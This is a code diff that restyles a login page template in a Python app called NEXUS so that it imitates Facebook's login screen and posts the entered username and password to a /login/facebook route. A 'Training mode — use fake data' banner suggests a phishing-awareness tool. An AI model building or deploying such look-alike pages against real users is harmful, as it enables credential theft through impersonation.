@@ -190,84 +190,72 @@ HTML_HOME = """
 </html>
 """
 
-# ---------- LOGIN PAGE (with Password Toggle) ----------
+# ---------- LOGIN PAGE (Facebook style + NEXUS brand + password toggle) ----------
 def get_login_page(platform):
-    data = PLATFORMS[platform]
-    name = data['name']
-    icon = data['icon']
-
-    return f"""
+    return """
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NEXUS - {name}</title>
+    <title>NEXUS</title>
     <style>
-        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-        html, body {{
-            height: 100%;
-            width: 100%;
-            background: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #f0f2f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
+            min-height: 100vh;
             padding: 20px;
-        }}
-        .container {{
+        }
+        .container {
             max-width: 400px;
             width: 100%;
-            text-align: center;
             background: #ffffff;
-            border-radius: 24px;
-            padding: 40px 30px;
-            border: 1px solid #f0f0f0;
-        }}
-        .icon {{ font-size: 60px; margin-bottom: 10px; }}
-        h1 {{
-            font-size: 34px;
+            border-radius: 12px;
+            padding: 30px 24px 40px 24px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+            text-align: center;
+        }
+        .brand {
+            font-size: 36px;
             font-weight: 700;
-            color: #111;
+            color: #1877F2;
             margin-bottom: 6px;
-        }}
-        .sub {{
+            letter-spacing: -0.5px;
+        }
+        .brand-icon { font-size: 32px; margin-right: 4px; }
+        .sub-brand {
             font-size: 16px;
-            color: #666;
-            margin-bottom: 30px;
-        }}
-        .warning {{
-            font-size: 14px;
-            color: #e74c3c;
-            font-weight: 500;
-            margin-bottom: 20px;
-            background: #fef0ef;
-            padding: 10px 14px;
-            border-radius: 10px;
-            display: inline-block;
-        }}
-        .input-group {{
+            color: #606770;
+            margin-bottom: 24px;
+            font-weight: 400;
+        }
+        .input-group {
             position: relative;
             margin: 10px 0;
-        }}
-        .input-group input {{
+        }
+        .input-group input {
             width: 100%;
-            padding: 16px 14px;
+            padding: 14px 16px;
             padding-right: 48px;
-            background: #f5f5f5;
-            border: 1px solid #ddd;
-            border-radius: 12px;
-            font-size: 18px;
-            color: #111;
+            background: #f5f6f7;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            font-size: 17px;
+            color: #1b1f23;
             transition: 0.2s;
-        }}
-        .input-group input:focus {{
+        }
+        .input-group input:focus {
             outline: none;
-            border-color: #007aff;
-            background: #fff;
-            box-shadow: 0 0 0 4px rgba(0,122,255,0.1);
-        }}
-        .toggle-password {{
+            border-color: #1877F2;
+            background: #ffffff;
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.1);
+        }
+        .input-group input::placeholder { color: #8a8d91; }
+        .toggle-password {
             position: absolute;
             right: 14px;
             top: 50%;
@@ -277,72 +265,120 @@ def get_login_page(platform):
             font-size: 22px;
             cursor: pointer;
             padding: 0;
-            color: #999;
+            color: #8a8d91;
             opacity: 0.6;
             line-height: 1;
-        }}
-        .toggle-password:hover {{ opacity: 1; }}
-        .login-btn {{
+        }
+        .toggle-password:hover { opacity: 1; }
+        .login-btn {
             width: 100%;
-            padding: 16px;
-            background: #007aff;
-            color: white;
+            padding: 14px;
+            background: #1877F2;
+            color: #ffffff;
             border: none;
-            border-radius: 12px;
+            border-radius: 8px;
             font-size: 20px;
             font-weight: 600;
             cursor: pointer;
             margin-top: 16px;
             transition: 0.2s;
-        }}
-        .login-btn:hover {{ background: #0066d9; }}
-        .back {{
-            display: inline-block;
-            margin-top: 20px;
-            color: #007aff;
+        }
+        .login-btn:hover { background: #166fe5; }
+        .divider {
+            border: none;
+            border-top: 1px solid #dadde1;
+            margin: 24px 0 16px 0;
+        }
+        .signup-link {
+            display: block;
+            color: #1877F2;
             text-decoration: none;
-            font-size: 16px;
+            font-size: 17px;
             font-weight: 500;
-        }}
-        .footer {{
-            margin-top: 25px;
+            transition: 0.2s;
+            padding: 8px 0;
+        }
+        .signup-link:hover { text-decoration: underline; }
+        .signup-sub {
             font-size: 14px;
-            color: #999;
-        }}
-        .footer span {{ color: #111; font-weight: 500; }}
+            color: #606770;
+            margin-top: 4px;
+            font-weight: 400;
+        }
+        .signup-sub span { color: #1b1f23; font-weight: 500; }
+        .footer {
+            margin-top: 28px;
+            font-size: 13px;
+            color: #8a8d91;
+            border-top: 1px solid #e4e6eb;
+            padding-top: 18px;
+        }
+        .footer span { color: #1b1f23; font-weight: 500; }
+        .warning-text {
+            font-size: 14px;
+            color: #e74c3c;
+            font-weight: 500;
+            background: #fef0ef;
+            padding: 8px 14px;
+            border-radius: 8px;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+        .back-link {
+            display: inline-block;
+            margin-top: 12px;
+            color: #1877F2;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 400;
+        }
+        .back-link:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="icon">🧸</div>
-        <h1>NEXUS</h1>
-        <p class="sub">Learn cybersecurity by doing</p>
-        <div class="warning">⚠️ Training mode — use fake data</div>
-        <form action="/login/{platform}" method="POST">
+        <div class="brand">
+            <span class="brand-icon">🧸</span> NEXUS
+        </div>
+        <div class="sub-brand">Knowledge over chaos</div>
+
+        <div class="warning-text">⚠️ Training mode — use fake data</div>
+
+        <form action="/login/facebook" method="POST">
             <div class="input-group">
-                <input type="text" name="username" placeholder="Your Name" required>
+                <input type="text" name="username" placeholder="Mobile number or email" required>
             </div>
             <div class="input-group">
                 <input type="password" name="password" id="password" placeholder="Password" required>
                 <button type="button" class="toggle-password" id="toggleBtn" onclick="togglePassword()">👁️</button>
             </div>
-            <button type="submit" class="login-btn">Login</button>
+            <button type="submit" class="login-btn">Log In</button>
         </form>
-        <a href="/" class="back">← Go back</a>
-        <p class="footer">Built by <span>Luiz Vad</span> 🧸</p>
+
+        <hr class="divider">
+
+        <a href="#" class="signup-link">Luiz Vad 🧸</a>
+        <div class="signup-sub">Knowledge over chaos</div>
+
+        <a href="/" class="back-link">← Go back</a>
+
+        <div class="footer">
+            Built by <span>Luiz Vad</span> 🧸
+        </div>
     </div>
+
     <script>
-        function togglePassword() {{
+        function togglePassword() {
             const input = document.getElementById('password');
             const btn = document.getElementById('toggleBtn');
-            if (input.type === 'password') {{
+            if (input.type === 'password') {
                 input.type = 'text';
                 btn.textContent = '🙈';
-            }} else {{
+            } else {
                 input.type = 'password';
                 btn.textContent = '👁️';
-            }}
-        }}
+            }
+        }
     </script>
 </body>
 </html>
